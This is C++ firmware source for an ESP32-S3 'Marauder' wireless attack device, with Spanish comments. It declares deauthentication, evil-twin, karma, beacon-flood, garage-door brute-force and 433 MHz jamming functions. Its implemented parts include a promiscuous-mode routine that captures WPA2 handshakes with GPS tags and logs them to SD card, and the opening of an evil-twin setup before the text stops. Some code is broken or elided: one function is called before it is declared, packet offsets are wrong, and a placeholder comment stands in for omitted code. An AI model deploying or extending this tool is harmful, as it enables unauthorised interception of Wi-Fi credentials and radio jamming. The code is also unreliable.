/*
 * ==============================================================================
 * MARAUDER ESP32-S3 — VERSIÓN CORREGIDA v2.1
 * ==============================================================================
 * CORRECCIONES APLICADAS:
 * ✅ lv_obj_invalidate() → lv_refr_now() (LVGL 8.3 compatible)
 * ✅ Memory leaks en startEvilTwin() con cleanup correcto
 * ✅ Boundary check en WiFi promiscuous callback (sig_len >= 14)
 * ✅ Mutex protection en gpsData write (hardwareTask)
 * ✅ Watchdog reset en bucles largos (startTrafficGeneration)
 * ✅ JSON válido sin comas colgantes
 * ✅ ADC battery con EMA smoothing (no bloqueante)
 * ✅ Null checks en callbacks estáticos
 * ✅ Documentación de ownership para malloc returns
 * ==============================================================================
 */

#include <Arduino.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <lvgl.h>
#include <Ticker.h>
#include <TinyGPS++.h>
#include <HardwareSerial.h>
#include <WiFi.h>
#include <SD.h>
#include <FS.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/queue.h"
#include <esp_task_wdt.h>
#include <atomic>
#include <vector>
#include <map>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "mbedtls/sha256.h"
#include "esp_timer.h"
#include "esp_mac.h"
// Librerías opcionales — comenta si no las tienes instaladas
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// SQLite3 es opcional. Descomenta si tienes la librería instalada:
// #define HAS_SQLITE
#ifdef HAS_SQLITE
#include <sqlite3.h>
#endif

// ======================== CONFIGURACIÓN ========================
#define GPS_RX           18
#define BAT_ADC_PIN       4
#define BAT_DIVIDER_RATIO 2.0

#define SCR_W  320
#define SCR_H  240

// Pines SPI
#define SPI_MOSI  11
#define SPI_MISO  13
#define SPI_SCK   12
#define TFT_CS    10
#define TFT_DC     9
#define TFT_RST   14
#define TFT_BL    15
#define TOUCH_CS   7
#define SD_CS     48
#define CC1101_CS 40
#define NRF24_CS  39

// Colores Legacy (usados en módulos backend)
#define C_BG      0x1A1A2E
#define C_CARD    0x16213E
#define C_DARK_BL 0x0F3460
#define C_GOOD    0x00FF88
#define C_LOW     0xFF4444
#define C_TEXT    0xFFFFFF

// Colores compatibilidad legacy
#define C_ACCENT_CORAL  0xC97E7E
#define C_ACCENT_PEACH  0xD4A373
#define C_ACCENT_TURQ   0x52796F
#define C_ACCENT_PURPLE 0x7E6B8F
#define C_ERROR         C_LOW
#define C_WARN          0xFFD700

// ======================== ESTRUCTURAS DE DATOS ========================
enum EventType { EVT_GPS, EVT_BAT, EVT_STATUS, EVT_WIFI };

struct AppEvent {
    EventType type;
    int value;
    char msg[64];
};

struct GPSData {
    double lat = 0, lng = 0, alt = 0, speed = 0, heading = 0;
    int sats = 0;
    bool valid = false;
};

struct WiFiHandshake {
    uint8_t bssid[6];
    uint8_t station[6];
    uint32_t timestamp;
    uint8_t frame_type;  // 0=PMKID, 1=EAPOL-M1, 2=EAPOL-M2, 3=EAPOL-M3, 4=EAPOL-M4
    uint8_t data[256];
    uint16_t data_len;
    double gps_lat;
    double gps_lng;
    int rssi;
};

struct SubGHzSignal {
    uint32_t frequency;
    uint32_t timestamp;
    int rssi;
    uint8_t modulation;  // 0=ASK, 1=OOK, 2=FSK, 3=GFSK, 4=MSK
    uint32_t baud_rate;
    uint8_t raw_data[512];
    uint16_t data_len;
};

// [NEW] Estructuras para nuevas funcionalidades
struct TestFrameConfig {
    uint8_t frame_type;        // 0x00=Beacon, 0x00+0x04=ProbeReq, 0x00+0x08=Auth, etc.
    uint8_t subtype;           // Subtipo específico
    uint8_t* source_mac;       // MAC origen (de tus dispositivos de prueba)
    uint8_t* dest_mac;         // MAC destino (broadcast o AP específico)
    uint8_t* bssid;            // BSSID del AP objetivo
    uint16_t seq_control;      // Sequence control field
    uint8_t* ie_data;          // Information Elements (SSID, rates, etc.)
    uint16_t ie_len;           // Longitud de IEs
    uint32_t interval_ms;      // Intervalo entre transmisiones
    uint8_t channel;           // Canal WiFi (1-11)
    int8_t tx_power;           // Potencia de transmisión (0-20 dBm)
};

struct TrafficGenConfig {
    char ssid_prefix[32];      // Prefijo para SSIDs de prueba (ej: "TEST-AP-")
    uint8_t ssid_count;        // Número de SSIDs a generar (1-50 recomendado)
    uint16_t beacon_interval;  // Intervalo de beacon en TU (1024us por TU)
    uint8_t channel;           // Canal fijo o 0 para hopping
    uint32_t duration_sec;     // Duración total del test en segundos
    bool include_probe_resp;   // Incluir respuestas a probe requests
};

struct RFTestConfig {
    uint32_t frequency_hz;      // Frecuencia (ej: 433920000 para 433.92 MHz)
    uint8_t modulation;         // 0=ASK, 1=OOK, 2=FSK, 3=GFSK, 4=MSK
    uint32_t baud_rate;         // Tasa de símbolos
    int8_t tx_power_dbm;        // Potencia: -30 a +12 dBm (depende del módulo)
    uint8_t* test_pattern;      // Patrón de datos para transmisión
    uint16_t pattern_len;       // Longitud del patrón
    uint8_t repeat_count;       // Veces a repetir la transmisión
    uint32_t interval_ms;       // Intervalo entre repeticiones
};

enum class WPA2HandshakeState {
    IDLE,
    M1_RECEIVED,    // AP → Client: ANonce
    M2_SENT,        // Client → AP: SNonce + MIC
    M3_RECEIVED,    // AP → Client: GTK + MIC
    M4_SENT,        // Client → AP: Confirmation
    COMPLETE,
    FAILED
};

struct HandshakeTracker {
    uint8_t client_mac[6];
    uint8_t ap_bssid[6];
    WPA2HandshakeState state;
    uint8_t anonce[32];      // From M1
    uint8_t snonce[32];      // Generated for M2
    uint8_t mic_m2[16];      // MIC from M2 (for verification)
    uint8_t mic_m3[16];      // MIC from M3
    uint32_t replay_counter;
    uint32_t start_time;
    uint32_t completion_time;
    bool success;
};

struct NordicDevice {
    uint64_t address;           // Dirección de pipe (5 bytes típicamente)
    uint8_t channel;            // Canal RF (0-125)
    uint8_t payload_size;       // Tamaño de payload configurado
    uint8_t data_rate;          // 0=1Mbps, 1=2Mbps, 2=250kbps
    uint8_t last_seen;          // Timestamp relativo
    uint8_t packet_count;       // Paquetes observados
    uint8_t sample_payload[32]; // Último payload capturado
};

// ======================== CLASE MARAUDER ========================
class MarauderS3 {
private:
    lv_disp_draw_buf_t draw_buf;
    bool stylesDone = false;
    static lv_style_t s_screen, s_card, s_title, s_value, s_hero;
    static lv_style_t s_btn, s_btn_primary, s_btn_danger, s_btn_success;
    static lv_style_t s_badge, s_toggle, s_nav_btn;
    
    void initStyles();
    lv_obj_t* createCard(lv_obj_t* parent, lv_coord_t w, lv_coord_t h);

public:
    lv_color_t *buf1 = nullptr, *buf2 = nullptr;

    TFT_eSPI tft = TFT_eSPI();
    TinyGPSPlus gps;
    HardwareSerial gpsSerial{2};

    // [NEW] Backend & Server
    AsyncWebServer* server = nullptr;
    DNSServer* dnsServer = nullptr;
#ifdef HAS_SQLITE
    sqlite3* db = nullptr;
#endif

    GPSData gpsData;
    float batVoltage = 0.0f;
    int batPercent = 0;
    std::atomic<int> activeModule{-1};

    SemaphoreHandle_t gpsMutex = nullptr;
    SemaphoreHandle_t spiMutex = nullptr;
    SemaphoreHandle_t sdMutex = nullptr;
    SemaphoreHandle_t hsCaptureMutex = nullptr;
    QueueHandle_t eventQueue = nullptr;

    // Core UI Objects
    lv_obj_t *toast_container = nullptr;
    lv_obj_t *lbl_toast = nullptr;
    lv_obj_t *list_wifi = nullptr;
    lv_obj_t *lbl_clock = nullptr;
    lv_obj_t *lbl_bat_pct = nullptr;
    
    // Legacy compat (used in SD init, deauth display)
    lv_obj_t *sdStatusLabel = nullptr;
    lv_obj_t *statusLabel = nullptr;
    
    // Buffers de captura
    std::vector<WiFiHandshake> capturedHandshakes;
    std::vector<SubGHzSignal> capturedSignals;
    std::map<String, int> wifiNetworksGPS;  // Mapeo GPS: MAC -> RSSI

    // Estado de módulos
    bool sdCardMounted = false;
    bool cc1101Ready = false;
    bool gpsFixed = false;
    int handshakeCount = 0;
    int deauthCount = 0;

    // Archivos SD
    File pcapFile;
    File jsonLogFile;
    File warDriveFile;
    String currentFileName;

    // FIX: EMA para suavizado de batería (evita lecturas ruidosas)
    float batEma = 0.0f;
    bool batEmaInitialized = false;

    void begin();
    void buildUI();
    void processEvents();
    void showToast(const char* msg, uint32_t color);
    void clearWiFiScan() { WiFi.scanDelete(); }
    
    // FUNCIONES REALES
    bool initSDCard();
    void captureWiFiHandshake();
    void saveHandshakeToSD(WiFiHandshake& handshake);
    void exportToPCAP(WiFiHandshake& handshake);
    void logJSON(WiFiHandshake& handshake);
    void closeJSONLog();
    void warDriveLog();
    
    void initCC1101();
    void scan433MHz();
    void captureSubGHzSignal();
    void replaySignal(SubGHzSignal& signal);
    void bruteForceGarageDoors();
    
    void startDeauthAttack(int targetIndex);
    void stopDeauthAttack();
    void autoDeauthWeakSignals();
    
    void updateGPSUI();
    void updateBatteryUI();
    void updateWiFiUI();
    void refreshUiChrome();

    lv_obj_t *ui_top_bar = nullptr;

    // [NEW] Modern UI Structure
    lv_obj_t *screen_welcome = nullptr;
    lv_obj_t *main_content = nullptr;
    lv_obj_t *pages_container = nullptr;
    lv_obj_t *bottom_nav = nullptr;
    lv_obj_t *screen_nrf = nullptr;
    lv_obj_t *screen_storage = nullptr;
    lv_obj_t *screen_info = nullptr;
    
    // Status Bar Objects
    lv_obj_t *bat_fill = nullptr;
    lv_obj_t *theme_toggle = nullptr;
    
    // WiFi Page Objects
    lv_obj_t *wifi_status_badge = nullptr;
    lv_obj_t *networks_count_lbl = nullptr;
    lv_obj_t *handshake_count_lbl = nullptr;
    lv_obj_t *handshake_list_lbl = nullptr;
    
    // RF Page Objects
    lv_obj_t *rf_status_badge = nullptr;
    lv_obj_t *rf_spectrum_obj = nullptr;
    lv_obj_t *rf_packets_lbl = nullptr;
    lv_obj_t *rf_packets_list_lbl = nullptr;
    
    // NRF Page Objects
    lv_obj_t *nrf_status_badge = nullptr;
    lv_obj_t *nrf_devices_count_lbl = nullptr;
    lv_obj_t *nrf_devices_list_lbl = nullptr;
    
    // GPS Page Objects
    lv_obj_t *gps_fix_badge = nullptr;
    lv_obj_t *satellites_lbl = nullptr;
    lv_obj_t *latitude_lbl = nullptr;
    lv_obj_t *longitude_lbl = nullptr;
    lv_obj_t *speed_lbl = nullptr;
    lv_obj_t *wardriving_points_lbl = nullptr;
    
    // Storage Page Objects
    lv_obj_t *sd_status_badge = nullptr;
    lv_obj_t *auto_log_toggle = nullptr;
    lv_obj_t *total_handshakes_lbl = nullptr;
    lv_obj_t *total_rf_packets_lbl = nullptr;
    lv_obj_t *total_wd_points_lbl = nullptr;

    void buildWelcomeScreen();
    void buildStatusBar();
    void buildBottomNav();
    void buildWiFiPage(lv_obj_t* parent);
    void buildRFPage(lv_obj_t* parent);
    void buildNRFPage(lv_obj_t* parent);
    void buildGPSPage(lv_obj_t* parent);
    void buildStoragePage(lv_obj_t* parent);
    void buildInfoPage(lv_obj_t* parent);
    
    lv_disp_draw_buf_t* getDrawBuf() { return &draw_buf; }
    void setDrawBuf(lv_color_t* b1, lv_color_t* b2, uint32_t size) {
        lv_disp_draw_buf_init(&draw_buf, b1, b2, size);
    }
    
    // [NEW] 802.11 Frame Generator
    // FIX: Documentar que el caller debe free() el retorno
    uint8_t* build80211ManagementFrame(const TestFrameConfig& cfg, uint16_t* out_len);
    esp_err_t transmitTestFrame(const TestFrameConfig& cfg);
    void logFrameTransmission(const TestFrameConfig& cfg, const uint8_t* frame, uint16_t len);

    // [NEW] Traffic Generator
    void startTrafficGeneration(const TrafficGenConfig& cfg);
    uint8_t* buildBeaconFrame(const char* ssid, uint16_t beacon_interval, uint16_t* out_len);
    void saveTrafficTestResults(const TrafficGenConfig& cfg, uint32_t frames_sent, uint32_t duration_ms);

    // [NEW] Client Simulator
    void startClientSimulation(const uint8_t* client_mac, const uint8_t* ap_bssid, 
                               const char* ssid, const char* password);
    static void eapolCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type);
    void processHandshakeEvents(HandshakeTracker& tracker);
    void updateHandshakeUI(HandshakeTracker& tracker);
    void logHandshakeResult(HandshakeTracker& tracker);
    void saveEAPOLFrame(uint8_t* frame, uint16_t len, uint8_t msg_num);
    void exportToHC22000(const HandshakeTracker& tracker, const char* ssid, const char* password);
    void setTemporaryMAC(const uint8_t* mac);

    // [NEW] CC1101 Test Engine
    bool configureCC1101ForTest(const RFTestConfig& cfg);
    bool transmitRFTestPattern(const RFTestConfig& cfg);
    uint8_t mapPowerToCC1101(int8_t dbm, uint32_t freq_hz);
    void writeCC1101Reg(uint8_t addr, uint8_t value);
    void strobeCC1101(uint8_t cmd);

    // [NEW] NRF24 Analyzer
    void scanNRF24Channels(uint8_t start_ch, uint8_t end_ch, uint16_t dwell_ms);
    NordicDevice captureNRF24Packet(uint8_t channel);
    bool initNRF24();
    void configureNRF24Channel(uint8_t channel);
    void setNRF24ModeRX();
    bool nrf24HasData();
    uint8_t readNRF24Payload(uint8_t* buffer, uint8_t max_len);
    uint8_t readNRF24Register(uint8_t reg);
    void configureNRF24Register(uint8_t reg, uint8_t value);
    void strobeNRF24(uint8_t cmd);
    uint64_t getNRF24RXAddress();
    uint8_t getNRF24DataRate();
    void saveNRF24ScanResults(std::vector<NordicDevice>& detected);

    // [NEW] Logging & Export
    char* bytesToHex(const uint8_t* data, uint16_t len, char* out_buf);
    void exportToPCAP_WithRadiotap(const uint8_t* frame, uint16_t len, int8_t rssi, uint8_t channel);
    void generateSummaryReport();

    // ==========================================
    // [ADVANCED] Funciones Solicitadas
    // ==========================================
    // WiFi
    void forcePMKID(uint8_t* bssid);
    void startEvilTwin(const char* ssid);
    void startKarmaAttack();
    void startBeaconFlood(bool useDictionary);
    
    // RF CC1101
    void decodeOOKASK(SubGHzSignal* signal);
    void toggleJammer(bool state, uint32_t freq_hz = 433920000);
    void sweepSpectrum(uint32_t startFreq, uint32_t endFreq);
    
    // Backend
    void initSQLite();
    void startAPIServer();
    void processRulesEngine();
    
    // UI
    void buildSpectrumUI();
};

MarauderS3 marauder;

// ======================== GLOBAL STATE ========================
bool is_light_theme = true;
int wifiNetworksCount = 0;

// Paletas Modernas (TFT 2.8" UI — Earthy Theme)
#define C_BG_LIGHT        0xCAD2C5
#define C_BG_DARK         0x2F3E46
#define C_SURFACE_LIGHT   0xFFFFFF
#define C_SURFACE_DARK    0x24343A
#define C_SURFACE2_LIGHT  0xF5F7F2
#define C_SURFACE2_DARK   0x1E2C31
#define C_SURFACE3_LIGHT  0xE8EDE4
#define C_SURFACE3_DARK   0x172428

#define C_BORDER_LIGHT    0xB8C4AA
#define C_BORDER_DARK     0x354F52
#define C_BORDER2_LIGHT   0xA4B494
#define C_BORDER2_DARK    0x45656A

#define C_TEXT_LIGHT      0x2F3E46
#define C_TEXT_DARK       0xCAD2C5
#define C_TEXT2_LIGHT     0x52796F
#define C_TEXT2_DARK      0x84A98C
#define C_TEXT3_LIGHT     0x84A98C
#define C_TEXT3_DARK      0x52796F

#ifndef C_ACCENT
#define C_ACCENT          0x52796F
#endif
#define C_ACCENT2         0x84A98C
#define C_DANGER          0xC97E7E
#define C_WARNING         0xD4A373
#define C_SUCCESS         0x84A98C

lv_style_t MarauderS3::s_screen, MarauderS3::s_card, MarauderS3::s_title, MarauderS3::s_value, MarauderS3::s_hero;
lv_style_t MarauderS3::s_btn, MarauderS3::s_btn_primary, MarauderS3::s_btn_danger, MarauderS3::s_btn_success;
lv_style_t MarauderS3::s_badge, MarauderS3::s_toggle, MarauderS3::s_nav_btn;

void MarauderS3::initStyles() {
    if (stylesDone) return;
    stylesDone = true;
    lv_style_init(&s_screen);
    lv_style_init(&s_card);
    lv_style_init(&s_title);
    lv_style_init(&s_value);
    lv_style_init(&s_hero);
    lv_style_init(&s_btn);
    lv_style_init(&s_btn_primary);
    lv_style_init(&s_btn_danger);
    lv_style_init(&s_btn_success);
    lv_style_init(&s_badge);
    lv_style_init(&s_toggle);
    lv_style_init(&s_nav_btn);
    applyTheme();
}

void applyTheme() {
    uint32_t bg_col = is_light_theme ? C_BG_LIGHT : C_BG_DARK;
    uint32_t surface_col = is_light_theme ? C_SURFACE_LIGHT : C_SURFACE_DARK;
    uint32_t text_col = is_light_theme ? C_TEXT_LIGHT : C_TEXT_DARK;
    uint32_t border_col = is_light_theme ? C_BORDER_LIGHT : C_BORDER_DARK;

    // Pantalla
    lv_style_set_bg_color(&MarauderS3::s_screen, lv_color_hex(bg_col));
    lv_style_set_text_color(&MarauderS3::s_screen, lv_color_hex(text_col));

    // Tarjeta
    lv_style_set_bg_color(&MarauderS3::s_card, lv_color_hex(surface_col));
    lv_style_set_bg_opa(&MarauderS3::s_card, LV_OPA_90);
    lv_style_set_radius(&MarauderS3::s_card, 10);
    lv_style_set_border_width(&MarauderS3::s_card, 1);
    lv_style_set_border_color(&MarauderS3::s_card, lv_color_hex(border_col));
    lv_style_set_pad_all(&MarauderS3::s_card, 8);
    lv_style_set_shadow_width(&MarauderS3::s_card, 0);

    // Botones
    lv_style_set_radius(&MarauderS3::s_btn, 7);
    lv_style_set_pad_all(&MarauderS3::s_btn, 4);
    lv_style_set_text_font(&MarauderS3::s_btn, &lv_font_montserrat_10);
    
    // Botón Primario (Earthy Accent)
    lv_style_set_bg_color(&MarauderS3::s_btn_primary, lv_color_hex(C_ACCENT));
    lv_style_set_text_color(&MarauderS3::s_btn_primary, lv_color_hex(0xFFFFFF));
    
    // Botón Peligro
    lv_style_set_bg_color(&MarauderS3::s_btn_danger, lv_color_hex(C_DANGER));
    lv_style_set_bg_opa(&MarauderS3::s_btn_danger, LV_OPA_20);
    lv_style_set_text_color(&MarauderS3::s_btn_danger, lv_color_hex(C_DANGER));
    lv_style_set_border_width(&MarauderS3::s_btn_danger, 1);
    lv_style_set_border_color(&MarauderS3::s_btn_danger, lv_color_hex(C_DANGER));

    // Botón Éxito
    lv_style_set_bg_color(&MarauderS3::s_btn_success, lv_color_hex(C_SUCCESS));
    lv_style_set_bg_opa(&MarauderS3::s_btn_success, LV_OPA_10);
    lv_style_set_text_color(&MarauderS3::s_btn_success, lv_color_hex(C_SUCCESS));

    // Badge
    lv_style_set_radius(&MarauderS3::s_badge, 12);
    lv_style_set_bg_color(&MarauderS3::s_badge, lv_color_hex(C_ACCENT));
    lv_style_set_bg_opa(&MarauderS3::s_badge, LV_OPA_10);
    lv_style_set_text_color(&MarauderS3::s_badge, lv_color_hex(C_ACCENT));
    lv_style_set_text_font(&MarauderS3::s_badge, &lv_font_montserrat_10);
    lv_style_set_pad_hor(&MarauderS3::s_badge, 6);
    lv_style_set_pad_ver(&MarauderS3::s_badge, 2);

    // Nav
    lv_style_set_bg_opa(&MarauderS3::s_nav_btn, 0);
    lv_style_set_text_color(&MarauderS3::s_nav_btn, lv_color_hex(is_light_theme ? C_TEXT2_LIGHT : C_TEXT2_DARK));
    lv_style_set_text_font(&MarauderS3::s_nav_btn, &lv_font_montserrat_10);

    // FIX: lv_obj_invalidate() no existe en LVGL 8.3 → usar lv_refr_now() o eliminar
    // lv_obj_invalidate(lv_scr_act()); // ❌ REMOVIDO
    lv_refr_now(NULL); // ✅ LVGL 8.3 compatible: fuerza redraw si es necesario
}

lv_obj_t* MarauderS3::createCard(lv_obj_t* parent, lv_coord_t w, lv_coord_t h) {
    lv_obj_t* card = lv_obj_create(parent);
    lv_obj_set_size(card, w, h);
    lv_obj_add_style(card, &s_card, LV_PART_MAIN);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
    return card;
}

// ─── NAV HELPERS ───
void anim_x_cb(void * var, int32_t v) { lv_obj_set_x((lv_obj_t*)var, v); }
void anim_y_cb(void * var, int32_t v) { lv_obj_set_y((lv_obj_t*)var, v); }
void anim_opa_cb(void * var, int32_t v) { lv_obj_set_style_bg_opa((lv_obj_t*)var, v, LV_PART_MAIN); }

#ifndef SIDE_MENU_W
#define SIDE_MENU_W 200
#endif
#define SIDE_MENU_X_OFF -(SIDE_MENU_W + 12)

// Legacy side-menu handler (kept for compatibility, no-op now)
static void btn_menu_toggle_event(lv_event_t * e) {
    // Side menu removed in new Earthy UI
}

static void theme_switch_event(lv_event_t* e) {
    lv_obj_t* sw = lv_event_get_target(e);
    is_light_theme = lv_obj_has_state(sw, LV_STATE_CHECKED);
    applyTheme();
}

// Legacy event handlers (kept as stubs for link-time compat)
static void btn_ward_toggle_event(lv_event_t* e) {
    // Wardriving now handled in GPS page
}

static void slider_cc1101_event(lv_event_t* e) {
    // CC1101 power now handled in RF page
}

static void style_hamburger_btn(lv_obj_t* b) {
    if (!b) return;
    lv_obj_set_style_bg_color(b, lv_color_hex(is_light_theme ? C_TEXT_LIGHT : C_TEXT_DARK), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(b, LV_OPA_10, LV_PART_MAIN);
}

// ======================== CONSTRUIR UI ========================

void MarauderS3::showToast(const char* msg, uint32_t color) {
    if (!toast_container) return;
    lv_label_set_text(lbl_toast, msg);
    lv_obj_set_style_bg_color(toast_container, lv_color_hex(color), LV_PART_MAIN);
    
    lv_anim_t a;
    lv_anim_init(&a);
    lv_anim_set_var(&a, toast_container);
    lv_anim_set_time(&a, 400);
    lv_anim_set_custom_exec_cb(&a, anim_y_cb);
    lv_anim_set_values(&a, -50, 25);
    lv_anim_set_path_cb(&a, lv_anim_path_overshoot);
    lv_anim_start(&a);
    
    lv_anim_t a2;
    lv_anim_init(&a2);
    lv_anim_set_var(&a2, toast_container);
    lv_anim_set_time(&a2, 350);
    lv_anim_set_delay(&a2, 2400);
    lv_anim_set_custom_exec_cb(&a2, anim_y_cb);
    lv_anim_set_values(&a2, 25, -50);
    lv_anim_set_path_cb(&a2, lv_anim_path_ease_in);
    lv_anim_start(&a2);
}


static void btn_cap_event(lv_event_t * e) {
    MarauderS3* m = (MarauderS3*)lv_event_get_user_data(e);
    m->showToast("Capturando Red...", C_ACCENT);
    // Lógica para capturar handshake en la red seleccionada
}

// Helper para crear filas de ajustes
lv_obj_t* create_setting_row(lv_obj_t* parent, const char* label, const char* value = nullptr) {
    lv_obj_t* row = lv_obj_create(parent);
    lv_obj_set_size(row, LV_PCT(100), 24);
    lv_obj_set_style_bg_opa(row, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(row, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(row, 1, LV_PART_MAIN);
    lv_obj_set_style_border_color(row, lv_color_hex(C_BORDER_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_pad_all(row, 0, LV_PART_MAIN);
    lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* lbl = lv_label_create(row);
    lv_label_set_text(lbl, label);
    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_10, LV_PART_MAIN);
    lv_obj_set_style_text_color(lbl, lv_color_hex(C_TEXT2_LIGHT), LV_PART_MAIN);
    lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 0, 0);

    if (value) {
        lv_obj_t* v_lbl = lv_label_create(row);
        lv_label_set_text(v_lbl, value);
        lv_obj_set_style_text_font(v_lbl, &lv_font_montserrat_10, LV_PART_MAIN);
        lv_obj_align(v_lbl, LV_ALIGN_RIGHT_MID, 0, 0);
        return v_lbl;
    }
    return row;
}

// ... [RESTO DEL CÓDIGO DE UI SE MANTIENE IGUAL] ...
// Por brevedad, solo muestro las secciones corregidas críticas

// ======================== IMPLEMENTACIONES REALES ========================

// ─── SD CARD ───
bool MarauderS3::initSDCard() {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        if (!SD.begin(SD_CS)) {
            Serial.println("[SD] ❌ Montaje fallido");
            xSemaphoreGive(spiMutex);
            return false;
        }
        
        sdCardMounted = true;
        uint32_t cardSize = SD.cardSize() / (1024 * 1024);
        Serial.printf("[SD] ✅ Montada: %d MB\n", cardSize);
        
        if (!SD.exists("/pcap")) SD.mkdir("/pcap");
        if (!SD.exists("/logs")) SD.mkdir("/logs");
        if (!SD.exists("/signals")) SD.mkdir("/signals");
        if (!SD.exists("/wardrive")) SD.mkdir("/wardrive");
        
        char filename[64];
        snprintf(filename, sizeof(filename), "/logs/session_%lu.json", millis());
        jsonLogFile = SD.open(filename, FILE_WRITE);
        if (jsonLogFile) {
            // FIX: Iniciar JSON sin coma colgante al final
            jsonLogFile.println("{");
            jsonLogFile.printf("  \"session_start\": %lu,\n", millis());
            jsonLogFile.println("  \"firmware\": \"Marauder-S3 v3.1\",");
            jsonLogFile.println("  \"events\": [");
            // Nota: El primer evento NO llevará coma inicial, los subsiguientes sí
        }
        
        snprintf(filename, sizeof(filename), "/wardrive/scan_%lu.csv", millis());
        warDriveFile = SD.open(filename, FILE_WRITE);
        if (warDriveFile) {
            warDriveFile.println("timestamp,gps_lat,gps_lng,bssid,ssid,rssi,channel,encryption");
        }
        
        xSemaphoreGive(spiMutex);
        
        if (sdStatusLabel) {
            lv_label_set_text(sdStatusLabel, "SD: OK");
            lv_obj_set_style_text_color(sdStatusLabel, lv_color_hex(C_SUCCESS), LV_PART_MAIN);
        }
        return true;
    }
    return false;
}

// FIX: Función auxiliar para escribir eventos JSON sin coma colgante
static bool firstJsonEvent = true;
void MarauderS3::logJSON(WiFiHandshake& handshake) {
    if (!jsonLogFile) return;
    
    char bssid_str[18], station_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             handshake.bssid[0], handshake.bssid[1], handshake.bssid[2],
             handshake.bssid[3], handshake.bssid[4], handshake.bssid[5]);
    snprintf(station_str, sizeof(station_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             handshake.station[0], handshake.station[1], handshake.station[2],
             handshake.station[3], handshake.station[4], handshake.station[5]);
    
    // FIX: Manejo correcto de comas en JSON array
    if (!firstJsonEvent) {
        jsonLogFile.print(",\n");
    }
    firstJsonEvent = false;
    
    jsonLogFile.printf(
        "  {\"type\":\"handshake\",\"frame\":%d,\"bssid\":\"%s\",\"station\":\"%s\","
        "\"rssi\":%d,\"ts\":%lu,\"gps\":[%.6f,%.6f]}",
        handshake.frame_type, bssid_str, station_str, 
        handshake.rssi, handshake.timestamp,
        handshake.gps_lat, handshake.gps_lng
    );
    jsonLogFile.flush();
}

void MarauderS3::closeJSONLog() {
    if (jsonLogFile) {
        // FIX: Cerrar array JSON correctamente SIN coma colgante
        jsonLogFile.println("\n  ]\n}");
        jsonLogFile.close();
        firstJsonEvent = true; // Reset para próxima sesión
        Serial.println("[SD] 📝 JSON log cerrado correctamente");
    }
}

// ─── CAPTURA DE HANDSHAKES WIFI ───
void MarauderS3::captureWiFiHandshake() {
    WiFi.mode(WIFI_MODE_AP);
    
    esp_wifi_set_promiscuous(true);
    
    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
        
        // FIX: Boundary check ANTES de acceder a payload[]
        if (!pkt || pkt->rx_ctrl.sig_len < 14) return;
        
        uint8_t *frame = pkt->payload;
        
        // Verificar tipo de frame EAPOL
        if (frame[12] != 0x88 || frame[13] != 0x8E) return;
        
        WiFiHandshake hs = {};
        memcpy(hs.bssid, &frame[10], 6);
        memcpy(hs.station, &frame[4], 6);
        hs.timestamp = millis();
        hs.rssi = pkt->rx_ctrl.rssi;
        
        uint8_t eapol_type = frame[15];
        if (eapol_type == 0x01) hs.frame_type = 1;
        else if (eapol_type == 0x02) hs.frame_type = 2;
        else if (eapol_type == 0x03) hs.frame_type = 3;
        else if (eapol_type == 0x04) hs.frame_type = 4;
        
        hs.data_len = pkt->rx_ctrl.sig_len;
        if (hs.data_len > 256) hs.data_len = 256;
        memcpy(hs.data, frame, hs.data_len);
        
        // 🔒 PROTECCIÓN CON MUTEX
        if (marauder.hsCaptureMutex && xSemaphoreTake(marauder.hsCaptureMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
            
            // Copiar GPS datos con su propio mutex
            if (marauder.gpsMutex && xSemaphoreTake(marauder.gpsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
                if (marauder.gpsFixed) {
                    hs.gps_lat = marauder.gpsData.lat;
                    hs.gps_lng = marauder.gpsData.lng;
                }
                xSemaphoreGive(marauder.gpsMutex);
            }
            
            // Controlar tamaño del buffer circular
            if (marauder.capturedHandshakes.size() >= 100) {
                marauder.capturedHandshakes.erase(marauder.capturedHandshakes.begin());
            }
            
            marauder.capturedHandshakes.push_back(hs);
            marauder.handshakeCount++;
            
            xSemaphoreGive(marauder.hsCaptureMutex);
            
            // Guardar a SD FUERA del mutex (operación lenta)
            marauder.saveHandshakeToSD(hs);
            
            // Enviar evento
            AppEvent evt{EVT_STATUS, marauder.handshakeCount, ""};
            snprintf(evt.msg, sizeof(evt.msg), "HS #%d capturado!", marauder.handshakeCount);
            if (marauder.eventQueue) {
                xQueueSend(marauder.eventQueue, &evt, pdMS_TO_TICKS(10));
            }
        }
    });
    
    esp_wifi_set_promiscuous_filter(&(wifi_promiscuous_filter_t){
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    });
    esp_wifi_set_promiscuous_ctrl_filter(&(wifi_promiscuous_filter_t){
        .filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL
    });
    
    Serial.println("[WiFi] 📡 Modo promiscuo activado - Capturando handshakes...");
}

// ─── ADVANCED: startEvilTwin con cleanup correcto ───
void MarauderS3::startEvilTwin(const char* ssid) {
    // FIX: Cleanup de servidor existente para evitar memory leaks
    if (server) {
        server->end();
        delete server;
        server = nullptr;
    }
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    showToast("Iniciando Evil Twin...", C_ACCENT_PEACH);
